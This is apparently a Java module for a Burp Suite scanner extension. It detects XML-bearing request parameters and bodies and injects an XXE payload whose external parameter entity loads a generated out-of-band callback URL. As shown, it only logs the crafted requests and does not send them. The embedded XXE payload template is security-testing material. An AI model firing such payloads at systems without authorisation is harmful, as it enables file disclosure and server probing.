package burp.scan.active.poc;

import burp.IBurpExtenderCallbacks;
import burp.IHttpRequestResponse;
import burp.IParameter;
import burp.scan.active.ModuleBase;
import burp.scan.active.ModuleMeta;
import burp.scan.active.feature.Debug;
import burp.scan.lib.HTTPParser;
import burp.scan.lib.poc.ReversePayloadGenerator;
import burp.scan.lib.utils.BytesUtils;
import burp.scan.lib.utils.Logger;
import burp.scan.lib.web.WebPageInfo;
import kotlin.Triple;
import org.apache.commons.lang3.tuple.MutablePair;
import org.apache.commons.lang3.tuple.Pair;
import org.xml.sax.SAXException;


import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.*;


public class SimpleXXE implements ModuleBase, Debug {
    String PAYLOADS[] = {
            """
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "%s"> %ext;
]>
<r></r>"""
    };
    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        var params = webInfo.getReqInfo().getParameters();
        Logger logger = Logger.getLogger(this);
        List<Pair<Integer,Integer>> ranges = new ArrayList<>();
        for (var param : params) {
            if (param.getType() != IParameter.PARAM_XML) {
                try {
                    String value = URLDecoder.decode(param.getValue(), StandardCharsets.UTF_8.name());
                    DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
                    DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
                    dBuilder.parse(new ByteArrayInputStream(value.getBytes()));
                    ranges.add(new MutablePair<>(param.getValueStart(),param.getValueEnd()));
                } catch (ParserConfigurationException | IOException | SAXException ignored) {
                }
            }
        }

        if (Objects.requireNonNull(HTTPParser.getRequestHeaderValue(webInfo.getReqInfo(), "Content-Type")).contains("xml")) {
            ranges.add(new MutablePair<>(webInfo.getReqInfo().getBodyOffset(),webInfo.getRequest().length));
        }

        if (ranges.size() != 0) {
            Map<String, Triple<IHttpRequestResponse,String,String>> record = new HashMap<>();
            var reqRaw = webInfo.getRequest();
            for (var range : ranges) {
                for (var _payload : PAYLOADS) {
                    String url = ReversePayloadGenerator.getInstance().getReverseUrl();
                    var payload = String.format(_payload,url).getBytes();
                    var targetReqRaw = BytesUtils.replaceBytes(reqRaw,payload,range.getLeft(),range.getRight());
                    logger.debug(new String(targetReqRaw));
                }
            }
        }
    }

    @Override
    public Set<String> getTags() {
        return null;
    }

    @Override
    public ModuleMeta getMetadata() {
        return null;
    }
}
